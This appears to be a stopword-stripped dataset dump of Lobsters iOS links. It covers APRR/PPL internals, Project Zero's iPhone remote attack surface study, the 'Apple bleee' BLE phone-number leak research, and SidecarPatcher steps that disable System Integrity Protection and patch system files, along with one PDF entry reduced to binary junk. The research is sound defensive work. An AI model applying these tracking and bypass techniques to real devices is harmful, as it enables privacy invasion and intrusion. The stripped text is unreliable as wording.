sure enough affect precisely protection ppl page mapped let see sound familiar maybe unix environment maybe tool called chmod big enlightenment permission rwx form r w x four page table bit normally determine access protection lost meaning newer apple chip solely used construct number used index aprr register hold actual permission register used permission register register still unclear simply repeat process index krnusr reg reg jit enabled reg jit rw reg jit rx changed rwx x rwx rw x rw rwxrwx rwxrw rwrwx rwrw rx x rx r x r rxrx rxr r rx r r digit changed reg one corresponding rwrwx would seem like permission jit region mapped obviously also index reg beat around bush longer register tell u whether consult register use register mask certain bit ie digit question strip executable bit figured complete register table sensible name register name bit much bit shifting twiddling slide typhooncon talk get page table bit actual rwx permission available full page page would work standard implementation work chip aprr orange box register number two note still whole picture detail post gon na fit nice graph anymore confused bit coming top right hierarchical permission disable bit hpd basically page table already bit set say never map anything writeable write bit stripped entry mapped mitigation gone rogue remember earlier mentioned people speculation apple repurposed uxn bit said interesting way put time revisit let look ppl page table knowledge aprr work notice anything anything ppldataconst yep permission remapped remapped onto mean actually mapped x constitutes vulnerability let bruteforce kaslr slide simply installing mach exception handler repeatedly jumping location within kernel address range get exception type unmappedinaccessible memory get exception type hit ppldataconst note leak data page though might assume could exception message contains faulting instruction however obtained via copyin refuse operate kernel address poc available still time writing lot irony even end story leave rest exercise reader pentesting aprr aside info leak presented openly let go back try see protects aprr motivated attacker case jit thing pretty simple movk movk lsl movk lsl movk lsl ldr msr isb movk movk lsl movk lsl movk lsl ldr mr cmp bne write system register commpage address reconstructed value reloaded checked value currently register prevents u rop ing middle memcpy gadget changing register arbitrary value aprr protected face calling primitive memcpy function still happily put shellcode jit region change system register needed code jit region entire model fall apart freely change system register kernel side thing complex omit code brevity lot case considered ppl entry gadget also rop protection exit gadget page executable privileged mode need addition interrupt well panic dealt safe way panic handled percpu struct ppldata contains flag saying whether currently ppl flag get set ppl entry tramp cleared exit routing panic simply call latter flag set continuing path interrupt take similar albeit nuanced approach start ppltramp disabled set daifset back original value actually jumping ppltext rather checking percpu data struct exception vector simply check aprr register match privileged value go ppl exit tramp though still check whether match unprivileged value spin mean even somehow get control register reasonably set value existing two anyway since next exception take kill aprr safe ppl pull trick jit part ppl seems carefully sanitise input give random example came trust cache bother put faith pac instead monumentally let taking look io beta kernel though appears fixed apart might noteworthy jit single crack tear entire model ppldata single page table remapped nonppl written mean via peripheral dark art immediately used extend capability rest pplprotected memory eh probably fine right digging deeper xnu aprr alright guess get undocumented blackbox feature would outright irresponsible go drive limit right getting shellcode execution left exercise reader skill patience good bunch thing test register actually introduced reset maximal minimal value set access kernel memory userland bit settable field function hpd affect ktrr pan smap wxn permission accurately reflected instruction create otherwise unobtainable permission writeonly answer wrote good bunch shellcode run number different test dump result memory code available raw result summary register appeared core aprr register present back already apple seems planning quite unlike virtually register register reset maximum value respectively every bit set zero bit zero reset never set one also mean bit never settable tte hpd bit processed anything else yield call input value input value copied working value aprr pan wxn applied modifies working value make decision based input value rather working value instruction accurately reflect effective permission possible create writeonly memory amidst test result something stood though weird thing happen turn pan wxn let diff example first line aprr would dictate permission none yet read write appears following true pan enabled wxn enabled access privileged wxn applies pan apply aprr register consulted addition instruction seems enough pan wxn enabled break everything worth xnu run pan wxn still something like happen verilog code passage say say say apple hardware team really competent might track back bit yet already seen one mitigation break another conclusion aprr pretty cool feature even part kinda broke really like besides fact efficient elegant solution switching privilege untangles memory permission giving flexibility standard implementation like though clearly designed lockdown feature allowing take permission away rather freely remap also evident apple really fond postexploit mitigation mitigation general one hand getting control physical address space good bit harder hand apple stacking mitigation taking problematic turn adding new mitigation actively creates vulnerability last might gathered enough information make educated guess acronym aprr actually stand best guess access protection rerouting hear project zero try guess meaning behind acronym though apple engineer offer smug grin maybe also apple rick rolling typo feedback content question etc feel free open ticket ping twitter email net siguza till next time peace thanks windknown reason started looking aprr qwerty bounce idea one another sparkey testing bunch stuff device
122,Lobsters,ios,Apple iOS,The Fully Remote Attack Surface of the iPhone,https://googleprojectzero.blogspot.com/2019/08/the-fully-remote-attack-surface-of.html,fully remote attack surface iphone,,posted natalie silvanovich project zero several rumour report fully remote vulnerability affecting iphone used attacker last couple year limited information available technical detail vulnerability well underlying attack surface occur investigated remote interactionless attack surface iphone found several serious vulnerability vulnerability considered remote attacker require physical network proximity target able use vulnerability remote vulnerability described fully remote interactionless zero click require physical interaction target exploited work real time focused attack surface iphone reached remotely require user interaction immediately process input several attack surface iphone quality including sm mm vvm email imessage sm sm seemed like good starting point looked sm android past unlike android sm message processed native code iphone increase likelihood memory corruption vulnerability sm packet data unit pdus parsed commcenter binary using method sm controller parserawbytes creates instance class sm model containing detail message instance eventually processed sm controller processreceivedsmssync additional processing sends message process handle reviewed two method find vulnerability also noticed commcenter contained sm simulator triggered via xpc tool process sm deliver pdus arrived network simulator missing library likely exists internal test device wrote library implement needed functionality make simulator work tool available fuzzing sm tool uncover vulnerability mm mm message also processed commcenter bulk processing performed method mmsoperation decodemessage reviewed method using ida also fuzzed writing application called method io vulnerability discovered either method visual voicemail reviewing sm controller processreceivedsmssync noticed method forward many specially formatted sm message process one area looked interesting visual voicemail vvm reviewed previously android vvm feature allows voicemail message viewed visual format similar email displayed vvm work fetching voicemail message imap server maintained device carrier server url credential server provided device carrier sm iphone us different format vvm sm message publicly documented format determined content incoming vvm sm putting breakpoint commcenter sm pdus received following example incoming vvm message state stateactive servervvmattcom pwasdf attcom tried sending message android device modified send raw pdus found log showed additional query made server tried changing server server controlled several attempt able send message changed target device vvm server following limitation vvm must configured greeting message recorded device pid field sm must set vvm value target device carrier easily determined sim carrier different carrier carrier block vvm imap request external server case work carrier remotely possible attacker could get around using base station proximity target device look attack enough vvm imap viable attack surface carrier thought reasonably likely contain bug vvm us imap library email io imap server usually hardened attack untrusted email client common malicious client attack server attempt access user email far le common however client connect malicious server user need enter hand typically enter server trust mean server client attack surface likely le welltested realistic attack surface perspective email vvm change allows device connected malicious imap server without user interaction wondered imap library adequately reviewed attack surface drastically changed vvm implementation looked imap library ida find bug set fuzzing wrote fake imap server returned malformed response every request used sm simulator section constantly send vvm sm message triggering device query server uncovered one vulnerability implementation bug useafterfree nsstring occurs due incorrect handling namespace imap command imap server set connection first sends list command client get mailbox separator string sends namespace command get mailbox prefix io imap implementation separator string freed server encounter error code call namespace command check whether command succeeded continues even separator freed email looking imap implementation noticed several code path mime used vvm used email client processing message one obvious unusual vulnerability method mfmimepart content tooffset resultoffset downloadifnecessary ashtml iscomplete process incoming mime message sends specific decoder based mime type unfortunately implementation appending mime type string incoming message string decode calling resulting method meant unintended selector could called leading memory corruption found vulnerability version io clearly unexploitable io due change functionality unintended selector could called change appear security related issue could still cause crash though resolved email potential remote attack surface iphone unclear serious start user install thirdparty client instead using native email client email provider also filter incoming message remove malformed mime component needed reach vulnerability bug worked gmail signed native email client clear common configuration whether provider filtering could problem reaching similar bug imessage imessage native messaging client io mac device support sending receiving message variety formatting option also support extension allow custom message type sent received device extension written apple third party samuel gro√ü reviewed imessage extension installed default iphone start project samuel wrote tool send dump imessage message mac work hooking code imessage sends receives message frida either writing message console case dumping replacing different message case sending following sample message dumped tool mailto target gmailcom tel gid gv p tel mailto target gmailcom pv r hello world v binary plist containing several field following table interesting field plain text message content x xml message content bid balloon identifier plugin bp plugin data ati attribution info p participant noticed several field contain binary data deserialized nskeyedunarchiver class field also optionally compressed gzip get around wrote program call nsdata ftoptionallydecompressdata decompress mac command line specifically bp field deserialized springboard purpose notification make deserialization fully remote attack surface springboard also sandboxing io field also deserialized mobilesms process requires one click ati field also decoded without user interaction imagent process though restricted decode bp field nskeyedarchiver serialization encodes nsobject instance plist format example portion serialized object includes instance nsurl dict key class key dict key cf uid key integer integer dict key nsbase key dict key cf uid key integer integer dict key nsrelative key dict key cf uid key integer integer dict dict string http wwwgooglecom string dict key class key array string nsurl string string nsobject string array key classname key string nsurl string dict field nsbase nsrelative object used construct nsurl instance nsrelative field reference string http wwwgooglecom represents url location dictionary class classname field describes class instance referenced class field first dictionary deserializing instance decoder call nsurl initwithcoder contains code deserialize nsbase nsrelative field use initialize nsurl instance nskeyedarchiver serialization serialize deserialize objectivec class implement initwithcoder security feature called nssecurecoding allows developer limit decoded first class implement initwithcoder must also implement requiressecurecoding deserialization enabled nssecurecoding enabled prevents deserialization code accidentally exposed developer secure context secondly nssecurecoding requires deserialization call provide list allowed class deserialized class allowed important note though list allowed class complete list initwithcoder method called serialization example pseudocode representation nsurl initwithcoder omission follows nsurl initwithcoder nsurl u id decoder nsdata book decoder decodeobjectofclass nsdata class forkey nsminimalbookmarkdata book return urlbyresolvingbookmarkdata data nsstring base decoder decodeobjectofclass nsstring class forkey nsbase nsstring relative decoder decodeobjectofclass nsstring class forkey nsrelative return nsurl initwithstring base relativetourl relative url bookmark method need deserialize instance class nsstring nsrelative nsbase field nsstring class allowed deserialization likewise serialized data contains nsminimalbookmarkdata field deserialize instance nsdata class limit deserialization limit class returned limit attack surface class still reduce attack surface somewhat though several method used create nskeyedunarchiver instance deserialize object enable nssecurecoding default following method enable default initforreadingfromdata unarchivedobjectofclasses fromdata error following method initwithdata unarchiveobjectwithdata error initforreadingwithdata name method make especially clear whether nssecurecoding enabled especially similarly named initforreadingfromdata initforreadingwithdata first attempt finding bug looking place imessage performed deserialization without nssecurecoding hope able use deserialize webkit instance find way get load webpage containing webkit vulnerability many vulnerability found regular basis exploitability well understood unfortunately find deserialization without nssecurecoding next looked extension extension fairly new feature hoped find bug extension process serialized data bp field processing sometimes performed without user interaction extension support preview case springboard call previewsummary extension without user interaction version io also process entire input calling initwithpluginpayload without user interaction inconsistent based version occured later version testing found one bug digital touch extension extension allows user send message containing drawing visual element extension allowed use custom encoding long signal springboard attempt decode bp field digital touch us protobuf decode payload decodes several byte array one case incorrectly check length byte array copying leading outofbounds read issue likely exploitable path bug interesting link presentation extension display link preview link sent message work loading link webkit sender device generating preview text image sent destination device looked extension great detail looking way spawn webkit instance receiving device find webkit processing always appears done sender decided look bug initwithcoder method class allowed deserialized springboard generating message preview ian beer found several issue type allowing privilege escalation past class permitted springboard decodes bp field nsdictionary nsstring nsdata nsnumber nsurl nsuuid nsvalue subclass class level inheritance also allowed always case nskeyedunarchiver deserialization reviewed initwithcoder implementation class subclass imported springboard analysis resulted three vulnerability vulnerability deserializing class subclass nsstring initwithcoder implementation class deserializes byte array treated string null terminator even one lead string contains outofbounds memory created vulnerability nsurl initwithcoder affect mac url deserialized usually instance class nsstring decoded also possible nsdata instance deserialized treated bookmark mac possible bookmark ali alias format deprecated format processed framework called carboncore process alias file using many safe unsafe string handling function vulnerability caused heap corruption due unsafe call strcat important note bookmarking functionality never legitimately used imessage present nsurl deserialization universal across system initwithcoder implementation support input possibility even one never encountered normal use specific attack surface vulnerability deserializing subclass nsdata nsdatafilebackedfuture class allows buffer containing content file created load file data accessed deserialization implemented buffer length deserialized input data filename implementation never check deserialized length consistent length file eventually loaded violates basic guarantee nsdata class make length property correct length byte property cause variety problem including memory corruption explored future blog post also interesting note nsdatafilebackedfuture class hidden class class need public exported available deserialization reviewing initwithcoder implementation started wonder happens subclass allowed class implement initwithcoder turn follows normal inheritance rule mean use initwithcoder implementation superclass method class overridden called subclass turned possible many subclass allowed class example initwithcapacity common method implement call class check prevent inheritance commonly require direct inheritance ie subclass override needed method allowed subclass relies superclass implementation something need reviewed class class basis determined class available loading dyldsharedcache ida running script inspects objective c metadata one vulnerability found vulnerability occurs deserializing class pfarray extends nsarray implement pfarray initwithobjects count called nsarray initwithcoder method assumes object array reference likely case intended use class case deserialization mean array contains object already freed created used likely class never intended deserialized availability method initwithobjects count deserialization whenever containing library imported process deserializes array behaviour developer expect reported similar vulnerability class far know imported imessage likely imported application use deserialization another interesting question nskeyedarchiver serialization happens serialized object contains cycle fundamentally nskeyedarchiver format plist file containing numeric reference object reference cycle involving multiple object looking source ida deserialization object work roughly follows tempdict key return tempdict key copy objdict key return objdict key copy nsobject nssomeclass alloc tempdict key reference nsobject obj initwithcoder tempdict key nil objdict key obj return obj first time object deserialized alloc called class object returned alloc stored temporary dictionary retain reference object initwithcoder called allocated object call finished allocated object removed temporary dictionary object returned initwithcoder added permanent object dictionary add reference object couple problem scheme first guarantee initwithcoder return object called fact documentation state specifically guaranteed case moreover initwithcoder responsible releasing object case returned theoretically initwithcoder implementation could free object returned alloc deserialize field could reference object would lead reference returned invalid reference freed memory looked find initwithcoder implementation problem springboard possible exist application violate documented restriction behavior initwithcoder implementation another problem initwithcoder implementation end deserializing using object use object call completed cause problem certain method assume object complete change could continue change initwithcoder call completes looked vulnerability involving cycle found two bug first yet disclosing fix fully remediate issue another issue involves cycle serialized object vulnerability another subclass nsdictionary another optimized dictionary class requires key provided front case key provided instance class deserializes number key separately array containing key deserialized number key checked consistent key array length key deserialized key another instance use instance key number checked allows integer overflow leading memory corruption initwithcoder reachable otherwise nature nskeyedarchiver serialization make extremely difficult secure even nssecurecoding enabled nskeyedarchiver serialization unintentionally create extremely large attack surface give example attack surface following call secure coding enabled nskeyedunarchiver unarchivedobjectofclasses nsurl fromdata mydata error nil clearly includes url deserializer nsurl initwithcoder well subclass deserializers implemented calling application example nsmyurlsubclass initwithcoder also includes subclass nsurl library imported application example let say application import usernotifications framework case unsecurityscopedurl initwithcoder subclass nsurl would also part attack surface even library imported purpose serialization let look bit nsurl initwithcoder discussed earlier nsurl initwithcoder nsurl u id decoder nsdata book decoder decodeobjectofclass nsdata class forkey nsminimalbookmarkdata book return urlbyresolvingbookmarkdata data nsstring base decoder decodeobjectofclass nsstring class forkey nsbase nsstring relative decoder decodeobjectofclass nsstring class forkey nsrelative return nsurl initwithstring base relativetourl relative contains three call decodeobjectofclass forkey decoding object class nsstring nsdata nsurl respectively nsstring initwithcoder nsdata initwithcoder part attack surface nsurl initwithcoder implementation also parse provided nsdata object bookmark exists attack surface well attack surface also includes subclass nsstring nsdata assuming application import usernotifications framework well foundation corefoundation typically mandatory following deserialization function attack surface subclass two class nsdispatchdata initwithcoder nslocalizedstring initwithcoder nslocalizablestring initwithcoder unlocalizedstring initwithcoder looking two method allow even class unlocalizedstring initwithcoder deserializes nsarray instance meanwhile nslocalizedstring initwithcoder decodes object class nsdictionary nsnumber nsdate investigate subclass class purpose example clear allow even class increase attack surface even subclass class considering initwithcoder method subclass considering subclass allowed class could part deserialization due inheritance attack surface could even larger example nsstring initwithcoder call nsstring initwithstring nsstring initwithbytes length encoding depending field deserialized method subclass part attack surface case includes nsbigmutablestring initwithstring nsdebugstring initwithstring nsplaceholdermutablestring initwithbytes length encoding nsplaceholderstring initwithbytes length encoding allowed class similar increase attack surface due inheritance extremely large attack surface decoding url probably string attack surface get exponentially larger application grows example imagine impact importing extra library attack surface adding extra class allow list also relevant class different framework never intended used together combined serialization example url decoded string subclass another framework contains data object another framework resulting object contain many property class never intended expected expansive attack surface deserialization well many degree freedom available deserializing object many framework reason found many vulnerability imessage conclusion investigated remote attack surface iphone reviewed sm mm vvm email imessage several tool used test attack surface released reported total vulnerability since fixed majority vulnerability occurred imessage due broad difficult enumerate attack surface attack surface part normal use benefit user visual voicemail also large unintuitive attack surface likely led single serious vulnerability reported overall number severity remote vulnerability found substantial reducing remote attack surface iphone would likely improve security
123,Lobsters,ios,Apple iOS,Disable server-side logging of Siri requests,https://github.com/jankais3r/Siri-NoLoggingPLS,disable serverside logging siri request,join github today sign file permalink installation step direct link feedback form alternatively create profile using apple configurator resource license reload reload,configuration profile disabling serverside logging siri request mac iphone ipad dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time configuration profile disabling serverside logging siri request mac iphone ipad installation step open prevent serverside logging siri commandsmobileconfig file repository switch raw view download profile direct link finish profile installation setting step siri request longer logged feel like easier way achieve let apple know using feedback form alternatively create profile using apple configurator configuration profile disabling serverside logging siri request mac iphone ipad resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
124,Lobsters,ios,Apple iOS,Apple bleee. Everyone knows What Happens on Your iPhone,https://hexway.io/blog/apple-bleee/,apple bleee everyone know happens iphone,tl dr get mobile phone number introduction motivation wireless wireless everywhere nearby airdrop taking metro cheat exam phone number hash phonenumber phonenumber john iphone wifi password sharing hash phone number appleid email hlr request bidirectional example airpods protection feature pocs apple bleee link pybluetoothutils nearby adafruit bluefruit le sniffer wifi password sharing home location register nrf connect airdrop technische universit√§t darmstadt billion open interface eve mallory mitm do tracking attack io macos apple wireless direct link opendrop utility others handoff airpods wifi setting hotspot,user value privacy apple understands even see related pr activity happens iphone stay iphone let see true tl dr bluetooth apple device everyone nearby understand current status device get info battery device name wifi status buffer availability o version even get mobile phone number introduction motivation apple device appreciated ecosystem connects really convenient start using app one device continue another plus still access file even offline seems contradict happens iphone stay iphone policy nt let find apple privacy actually work wireless wireless everywhere want share photo friend iphone know actually device nearby macbook see run safari phone answer quite simple bluetooth wifi apple device constantly send large data packet via bluetooth le even currently using iphone communication still take place research analyzed kind data obtain listening bluetooth le frequency nearby let consider simple attack scenario attacker could find subway car know phone sends lot data via ble even hold includes phone status wifi status buffer availability o version go macbook apple watch airpods see happens video airdrop airdrop technology allows apple user share file without internet access registration service anonymous secure already know possible receive unsolicited content taking metro generation z us airdrop cheat exam well airdrop seems le anonymous thought possible identify phone sends phone number hash device around every time hit share attacker could create database phonenumber phonenumber region eg los angeles run special script laptop take subway trainwhen somebody attempt use airdrop get sender phone number hashrecover phone number hashcontact user imessage name obtained using truecaller device name often contains name eg john iphone watch demo video wifi password sharing another thing apple user share wifi password choose network list device start sending bluetooth le request device asking password friend know person requesting password broadband ble request contain data namely hash phone number appleid email first byte hash sent enough identify phone number actually number recovered hlr request provide phone number status region possible make victim device try connect wifi network thus force sending ble request open issue watch demo video bidirectional know iphone sends lot ble request also receives used attacker disguise certain device example airpods video friend phone get password corporate wifi video protection behavior feature work ecosystem vulnerabilitywe detected behavior io version starting including io beta unfortunately thing turn bluetooth devicebut also noticed old device like iphone sending ble message continuously even updated o version send limited number message example navigate wifi setting menu probably apple save battery power old device pocs find script github repository apple bleee link link resource protocol used apple device article outline research process initial idea first pocs technical specialist may find interesting proceed reading download whitepaper let take look ble traffic purpose slightly modified script pybluetoothutils repository unlock phone run ble sniffer python bleadvsearchpy turn phone see one byte reflects change screen status apple us advind message send current status data structure typical advertise data packet access address header advertising address lengthtype flag length type company id message type nearbyairdrop message length message data turning phone navigating menu changing setting running different apps phone calendar photo setting identified field responsible wifi buffer status several type ble message airdrop airpods nearby watch connection handoff wifi setting hotspot wifi join network nearby nearby message status wifi status home screen home screen home screen home screen lock screen lock screen calling home screen enough write simple packet analyzer allows u get data nearby apple device realtime video analyze ble packet chose use adafruit bluefruit le sniffer help analyze wireshark ble traffic wifi password sharing analized user identified two device interact process used connecting wifi trying connect network device sends following ble packet trying connect various ssid different device yes could reversed sharingd idaradaregydra found message following format flag type auth tag sha appleid sha phonenbr sha email sha ssid see device sends first byte hash phone numberemailappleid phonenumber probably device hash contact compare value ble message case match offer share wifi password course look process detail following article tried recover phone number byte hash first understand phone number format recommendation describing various format phone number maximum digit divided country code digit national destination code ndc subscriber number course format vary country idea calculate value number particular city made table phone number city population considering large number subscriber collision inevitable average collision number byte hash made api quick request table get number hash two approach ensuring accuracy identification hlr home location register lookup allows identifying inactive subscriber subscriber region number must associated appleid identify valid number checking imessage available certain number talk approach detail future article combining two approach accurately identify phone number almost case activate wifi password sharing popup device open issue thus script identifies user connected wifi video moreover send ble request wifi password hoping victim provide u example corporate network password talk vector article well way use android app like nrf connect clone repeat different ble message airdrop let see mechanism identifying user purpose sharing wifi password universal apple airdrop one point investigate privacy option receiving contact everyone device identify run airdrop follow ble sniffer structure message zero st sha appleid sha phone sha email sha zero see case device sends byte hash enough identify phone number traffic analysis showed ble used initiate airdrop transfer transfer happens via wifi using awdl technology establishes connection server receiver client sender analyze awdl packet use wireshark interface available device see sending mdns packet device exchange certificate use secure tl connection data transfer begin reverse engineering sharingd app responsible airdrop people technische universit√§t darmstadt released white papper billion open interface eve mallory mitm do tracking attack io macos apple wireless direct link airdrop white paper beautifully describes functioning airdrop take brief look airdrop protocol workflow authentification device sends identification data sender record data contains full hash phone number thus answer airdrop ble request get sender contact data including phone number hash slightly modified opendrop utility result video others see various ble message format encountered research handoff clipbrd seqnmbr encrdata airpods sending message make apple device display airpods inforamtion connected watch funny video video wifi setting icloud id hotspot battery cell serv cell bar
125,Lobsters,ios,Apple iOS,Memory Unsafety in Apple's Operating Systems,https://langui.sh/2019/07/23/apple-memory-safety/,memory unsafety apple operating system,lazyfishbarrel memory unsafety care entirely fixed io mojave aka macos xnu macos bug v security architecture ian beer path io,lazyfishbarrel tweeting statistic proportion memory unsafety related vulnerability various software little year however twitter great medium dispensing information per release basis great deeper analysis rather talking single release aggregated total memory unsafetyrelated vulnerability statistic apple two flagship operating system io macos memory unsafety care memory unsafety property programming language allows creation bug security vulnerability related memory access language like c c memory unsafe allow memory violation use uninitialized memory double free buffer overflow use free etc avoid programmer must perfectly allocate write read deallocate memory else serious vulnerability easily occur bug especially frustrating represent class issue entirely fixed moving language suffer limitation io io released september subsequently total feature point release unlike macos io series several small bugfix release correct security issue marked na bugscves remain present list total cve count memory unsafety bug percentage release na na na na na na na na na across entirety io apple fixed cf memory unsafety vulnerability mojave aka macos apple released macos mojave september subsequently issued point release across entirety mojave apple fixed cf memory unsafety vulnerability xnu macos statistic code ship macos io including kernel counted kernel kernel extension issue macos slicing number way find vulnerability whopping attributable directly memory unsafety bug v security architecture blackhat usa ian beer gave talk called path io discus apple approach security design contends security system design making promise poor software development practises keep go state given sufficient bug density security design irrelevant see statistic writing software memory unsafe language like c c providing least two third bug density additionally although conducted specific analysis effect relatively rare logical vulnerability cause code execution exception jit bug common outcome memory corruption thus memory unsafety causing majority security bug bug also likely severe switching language done overnight incremental conversion memory safe world need top priority improving memory safe toolchains training programmer new idiom phasing legacy memory unsafe codebases luxury necessity
126,Lobsters,ios,Apple iOS,"MitM, DoS, and Tracking Attacks on iOS and macOS Through Apple Wireless Direct Link",https://www.usenix.org/system/files/sec19fall_stute_prepub.pdf,mitm do tracking attack io macos apple wireless direct link,,obj length filter flatedecode stream x⁄≠z nŒ≥ u
127,Lobsters,ios,Apple iOS,The Clever Cryptography Behind Apple's 'Find My' Feature,https://www.wired.com/story/apple-find-my-cryptography-bluetooth/,clever cryptography behind apple find feature,worldwide developer conference keynote monday immediately wondered marketer snoop tracking public key encryption setup hash,apple executive craig federighi described new locationtracking feature apple device company worldwide developer conference keynote monday sufficiently paranoid physical security innovation potential privacy disaster security expert immediately wondered whether find would also offer new opportunity track unwitting user apple say built feature unique encryption system carefully designed prevent exactly sort apple itselfin upcoming version io macos new find feature broadcast bluetooth signal apple device even offline allowing nearby apple device relay location cloud help locate stolen laptop even sleeping thief bag turn apple elaborate encryption scheme also designed prevent interloper identifying tracking idevice bluetooth signal also keep apple learning device location even allows pinpoint amazing whole interaction endtoend encrypted anonymous federighi said wwdc keynote us tiny bit data piggyback existing network traffic need worry battery life data usage privacy seen anyone actually deploy anything like billion people matthew green john hopkins universityin background phone call wired following keynote apple broke privacy element explaining encrypted anonymous system avoids leaking location data willy nilly even device broadcast bluetooth signal explicitly designed let track device solution paradox turn trick requires least two apple device one emits constantly changing key nearby apple device use encrypt upload geolocation data apple device posse key decrypt locationsthat system would obviate threat marketer snoop tracking apple device bluetooth signal allowing build history every user location apple thing right lot ifs sound like could done private way say matthew green cryptographer john hopkins university even tracked walking around able recognize person one hour next fact find cryptography go one step denying even apple ability learn user location based bluetooth beacon would represent privacy improvement apple older tool like find iphone find friend nt offer safeguard apple learning locationhere new system work apple describes step step first set find apple apple confirmed need least two device feature generates unguessable private key shared device via endtoend encrypted communication machine posse keyeach device also generates public key public key encryption setup public key used encrypt data one decrypt without corresponding private key case one stored apple device beacon device broadcast via bluetooth nearby devicesthat public key frequently change rotating periodically new number thanks mathematical magic new number nt correlate previous version public key still retains ability encrypt data device decrypt apple refused say often key rotates every time change make much harder anyone use bluetooth beacon track movementssay someone steal macbook even thief carry around closed disconnected internet laptop emit rotating public key via bluetooth nearby stranger iphone interaction owner pick signal check location encrypt location data using public key picked laptop public key nt contain identifying information since frequently rotates stranger iphone ca nt link laptop prior location eitherthe stranger iphone uploads two thing apple server encrypted location hash laptop public key serve identifier since apple nt private key ca nt decrypt locationwhen want find stolen laptop turn second apple say contains private key laptop generated series rotating public key tap button find laptop ipad uploads hash public key apple identifier apple search million upon million stored encrypted location find matching hash one complicating factor ipad hash public key wo nt one stolen laptop since public key likely rotated many time since stranger iphone picked apple nt quite explain work john hopkins green point ipad could upload series hash previous public key apple could sort pull previous location laptop spottedapple return encrypted location laptop ipad use private key decrypt tell laptop last known location meanwhile apple never seen decrypted location since hashing function designed irreversible ca nt even use hashed public key collect information device
128,Lobsters,ios,Apple iOS,SidecarPatcher: Enable macOS 10.15 Sidecar on old Mac (2015 or older),https://github.com/pookjw/SidecarPatcher,sidecarpatcher enable macos sidecar old mac older,sidecarpatcher mactracker io app store freesidecar patch issue command line tool apple developer website system integrity protection turn system integrity protection mac system integrity protection terminal warning issue revert simplest method macos combo update macos combo update macos catalina combo update simplest method install macos catalinaapp using backup system integrity protection turn system integrity protection mac,sidecarpatcher enables sidecar old mac ipad macos sidecar disabled device apple ipad type terminal get model identifier mac sysctl hwmodel get model identifier ipad using app mactracker io app store script disables blacklist macos patch ipados root system jailbreaking required command line script want gui application try freesidecar benz tested macos nt work macos patch unstable many known issue read issue please use risk backup systemlibraryprivateframeworkssidecarcoreframework folder script nt provide original system file install latest version command line tool apple developer website requires apple developer account use freetier developer account disable system integrity protection turn system integrity protection mac disabling system integrity protection reboot normal macos check sip disabled csrutil status open terminal application clone repository running command git clone http githubcompookjwsidecarpatcher run mainswift sudo swift sidecarpatchermainswift need enter macos password ignore warning encounter error nt know fix upload log issue ca nt reply issue nt know xcrun error crashing many apps rebooting revert simplest method reinstall macos using macos combo update download macos combo update example using macos catalina download macos catalina combo update wo nt erase data reinstall system simplest method reinstall macos using install macos catalinaapp install without erasing disk wo nt erase data reinstall system using backup disable system integrity protection turn system integrity protection mac check sip disabled csrutil status run sudo mount uw command copy original sidecarcore folder sudo cp pathtooriginal systemlibraryprivateframeworkssidecarcoreframework make sure put right path sidecarcore pathtooriginal set permission sudo chmod r systemlibraryprivateframeworkssidecarcoreframework reboot want enable system integrity protection testing
129,Lobsters,ios,Apple iOS,The community gave us low-latency live streaming. Then Apple took it away,http://mux.com/blog/the-community-gave-us-low-latency-live-streaming-then-apple-took-it-away/,community gave u lowlatency live streaming apple took away,hl wallclock glasstoglass latency apple low latency hl alhls watch presentation read spec partial segment pushed segment blocking playlist request playlist delta update faster bitrate switching alhls implementation challenge query parameter usage blocking playlist reloads server push scale push multicdn strategy community low latency hl lhls github issue read article apple involve community alhls nonapple device go apple becoming much community centric organization,one bite dream come true applelast week wwdc apple announced usual cascade software update tradition last year roger panto took stage announce latest swathe change http live streaming hl specification year change intended reduce latency live video stream cost hl segmented delivery technology enables live ondemand video streaming device hl designed apple device used broadly across video streaming ecosystem including browser smart tv set top box game console simple protocol easy understand implement deliver master playlist often called manifest text file describes different resolution bitrate combination rendition content available separate playlist rendition contains list medium segment duration url get themwhile hl simple scalable prone high latency used live streaming context talking wallclock glasstoglass latency time something happening irl seen end user hl latency closely tied duration medium segment using generally lower limit segment duration found around second deliver passable streaming experience delivering latency around second traditional hl streaming setup longer segment duration latency upwards secondsthis year wwdc panto took stage announce apple updated hl include new lowlatency mode great saying lower latency video good thing right interesting first attempt write specification lowlatency hl specification open development within video developer community year based white paper two year old community approach used surface simpler widely deployable available technology apple use community work let take look approach apple took differs community working onapple low latency hl alhls first let look apple low latency hl solution work watch presentation read spec foot summary change apple made name lowlatency partial segmentsit allowable generate partial segment medium t cmaf chunk around duration contain several complete video audio frame probably full gop group picture set video frame sequence standalone apple refer part apple introduced new syntax hl playlist format allows part advertised head live hl playlist allow client download mean player get smaller group frame sooner come encoder rather waiting second frame ready downloadedinterestingly per specification part must added playlist downloadable full speed interesting note talk probably later pushed segmentsat fundamental level hl relies polling rendition playlist file check new available segment followed another http round trip retrieve new segment lowlatency delivery required overhead traditional http request becomes limiting factor low wallclock latency beapple new approach addressing use push push shorter medium part response playlist request playlist however fetched frequently apple new approach depending target latency part duration time secondblocking playlist requestsone new feature apple added mode http request playlist held period particular segment part available example client playing segment piece content request playlist rendition saying want response segment available intended allow player immediately request new playlist per point new piece medium immediately soon immediately previous one arrivedthis next feature functionality relies new clientserver communication apple introduced hl apple reserved query parameter starting hl new origin api used manipulate behavior playlist generationplaylist delta updatesone longrunning headache hl playlist bloatoverhead long running sport stream large live rewind window list segment within rendition playlist become long even using gzip easy hl rendition playlist become hundred kilobyte larger becomes acute problem world need download playlist every hundred millisecondsin hl update apple enables way delta playlist generated allows playlist contain segment contained within full playlist allows player request full playlist maintain internal state add using smaller delta playlist contain latest segment along low latency part head playlisti must say love feature mostly well thought really address long standing problem hl hope apple allow feature used outside lowlatency mode since playlist bloat real problem regardless user want lowlatency notfaster bitrate switchingfinally apple introduced small feature allows playlist response particular rendition contain information recent chunk segment available another rendition theory allows player make jump another rendition without needing make full playlist request start switchconceptually neat feature current version specification seems missing sufficient detail actually make work reliably practice apple demo actually support feature today worth noting feature seem designed allow jump directly segment another rendition rather optimize playlist request requesting blocking playlist update leveraging push potentially get part along requesti think little thought design could really useful particularly also way push initialization segment cmaf stream playlist response toowhat likely jump used hl wow lot moving part right pretty complex addition otherwise simple specification bonus point going implement feature talked yes including order get lowlatency hl stream work time least get application thus low latency implementation tested apple get app store signaled using special identifier application manifestthe biggest departure traditional hl approach change caused significant increase state need communicated playlist generation process encoder process historically process simple encoder generated new segment put onto storage cdn object store updated playlist indicate new segment available lot logic performed playlist generated including case hanging connection part 